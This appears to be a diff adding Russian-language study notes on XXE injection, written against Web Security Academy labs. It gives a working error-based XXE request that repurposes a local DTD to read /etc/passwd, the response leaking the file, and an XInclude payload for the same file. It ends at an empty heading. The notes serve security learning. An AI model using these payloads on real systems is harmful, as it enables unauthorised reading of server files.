@@ -448,3 +448,53 @@ gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false (No such file or di
 После того как вы проверили список распространенных DTD файлов, вам нужно получить его копию и изучить чтобы найти сущность которую можно переопределить, поскольку многие распространенные системы включающие DTD файлы являются open source, обычно можно быстро получить копии файлов через поиск в интернете.
 
 ## Пример Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+В лабораторной сказано что уязвимость находится в `Check stock`, поэтому для работы необходимо получить POST запрос, далее использовать DTD описанное выше, так же есть `hint` что в нашем случае у нас есть файл `/usr/share/yelp/dtd/docbookx.dtd`, а в нем внутренняя сущность `ISOamso`, которую мы и будем переопределять в результате получится следующий запрос: 
+
+```HTTP
+POST /product/stock HTTP/2
+Host: 0ae200ac04f2922d83399ed2004c003e.web-security-academy.net
+...
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+ <!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local;
+]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+На него мы получим следующий ответ: 
+
+```HTTP
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 2419
+
+"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+В результате и получаем решенную лабу
+
+---
+# Как найти скрытую поверхность атаки для XXE инъекций
+Поверхность атаки для уязвимостей XXE во многих случаях очевидна поскольку обычный HTTP трафик включает запросы, содержащие данные в формате XML, в других случаях поверхность атаки менее заметна, однако есои искать в нужных местах, вы найдете поверхность атаки XXE в запросах, которые не содержат явного XML
+
+# Атаки XInclude
+Некоторые приложения принимают данные отправленные клиентом, встраивают их на серверной стороне в XML-документ а затем парсят документ, примером этого является ситуация когда клиентские данные помещаются в серверный SOAP-запрос, который затем обрабатывается серверной службой SOAP
+
+В этой ситуации мы не можем провести классическую XXE атаку, поскольку мы не контролируем весь XML документ и не можем определить или изменить элемент `DOCTYPE`. Однако мы можем использовать `XInclude`(это механизм включения частей документов XML). `XInclude` часть спецификации XML позволяющая собирать XML документ из поддокументов, мы может поместить атаку `XInclude` в любое значение данных XML документа, поэтому ее можно выполнить в ситуациях когда вы контролируете лишь один фрагмент данных, помещаемый в серверный XML документ 
+
+Чтобы выполнить атаку `XInclude` необходимо сослаться на пространство имен `XInclude` и указать путь к файлу, который нужно включить, например 
+
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+# Пример 
